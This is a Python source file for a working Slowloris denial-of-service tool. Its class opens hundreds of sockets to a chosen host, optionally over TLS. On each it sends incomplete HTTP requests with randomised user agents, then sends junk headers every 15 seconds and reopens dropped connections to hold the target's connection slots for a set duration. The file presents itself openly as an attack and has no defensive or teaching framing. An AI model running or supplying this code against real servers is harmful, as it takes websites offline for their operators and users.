import asyncio
import random
import logging
import socket
import ssl
import time
from typing import List, Optional

class Slowloris:
    """
    Slowloris attack: keeps many connections open by sending partial HTTP requests.
    """
    def __init__(self, target_host: str, target_port: int = 80, proxies: Optional[List[str]] = None):
        self.target_host = target_host
        self.target_port = target_port
        self.proxies = proxies
        self.logger = logging.getLogger("Slowloris")
        self.sockets = []
        self._stop_event = asyncio.Event()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]

    def _create_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            
            # Simple connection without proxy for now (proxy support for raw sockets is more complex)
            s.connect((self.target_host, self.target_port))
            
            if self.target_port == 443:
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=self.target_host)

            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode("utf-8"))
            s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            return s
        except Exception as e:
            return None

    async def start(self, duration: int, socket_count: int = 200):
        self.logger.info(f"[*] Starting Slowloris on {self.target_host}:{self.target_port} with {socket_count} sockets...")
        start_time = time.time()
        
        # Initial socket creation
        for _ in range(socket_count):
            s = self._create_socket()
            if s:
                self.sockets.append(s)

        while not self._stop_event.is_set() and (time.time() - start_time) < duration:
            self.logger.info(f"[*] Active sockets: {len(self.sockets)}")
            
            # Send keep-alive headers
            for i in range(len(self.sockets)):
                try:
                    self.sockets[i].send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    # Recreate dead socket
                    s = self._create_socket()
                    if s:
                        self.sockets[i] = s
            
            await asyncio.sleep(15)

        self.logger.info("[+] Slowloris attack finished.")
        self.stop()

    def stop(self):
        self._stop_event.set()
        for s in self.sockets:
            try:
                s.close()
            except:
                pass
        self.sockets = []
